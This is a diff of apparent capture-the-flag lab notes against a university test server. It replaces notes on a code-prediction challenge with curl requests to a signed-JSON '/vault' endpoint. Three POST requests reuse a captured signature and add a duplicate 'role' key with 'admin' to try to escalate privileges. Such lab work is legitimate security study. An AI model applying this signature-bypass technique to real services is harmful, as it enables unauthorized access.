@@ -1,19 +1,28 @@
-1. nc cns-test.idlab.uantwerpen.be 50006
+curl -i http://cns-test.idlab.uantwerpen.be:50007/challenge
 
-2.
-=================================
- MARS RELAY AUTHENTICATION
-=================================
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.12.3
+Date: Wed, 28 Oct 2026 11:49:40 GMT
+Content-Type: application/json
+Content-Length: 177
+Connection: close
 
-Authentication codes are generated
-from hashed orbital telemetry.
+{"instructions":"POST JSON to /vault with X-Signature","message":{"action":"view","role":"user"},"signature":"817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69"}
 
-Predict the next authentication code
-before it is transmitted.
+1) Test 1 — basislijn (bevestigt dat de handtekening over precies deze compacte body gaat):
+curl -i -X POST http://cns-test.idlab.uantwerpen.be:50007/vault \
+  -H "X-Signature: 817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69" \
+  -H "Content-Type: application/json" \
+  --data-raw '{"action":"view","role":"user"}'
 
-Codes are hexadecimal.
+2) Test 2 — dubbele sleutel, admin eerst, user laatst:
+curl -i -X POST http://cns-test.idlab.uantwerpen.be:50007/vault \
+  -H "X-Signature: 817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69" \
+  -H "Content-Type: application/json" \
+  --data-raw '{"action":"view","role":"admin","role":"user"}'
 
-
-CURRENT CODE: 0e771df3c602d0ab76bd51fa7a56b552cf4a8f42e17563417e3eb3508a199e49
-...
-Voer script uit om N aantal codes te voorspellen
+3) Test 3 — dubbele sleutel, user eerst, admin laatst:
+curl -i -X POST http://cns-test.idlab.uantwerpen.be:50007/vault \
+  -H "X-Signature: 817e86132b480782043d61602c1843100dc8002186502619e802913d918a0f69" \
+  -H "Content-Type: application/json" \
+  --data-raw '{"action":"view","role":"user","role":"admin"}'
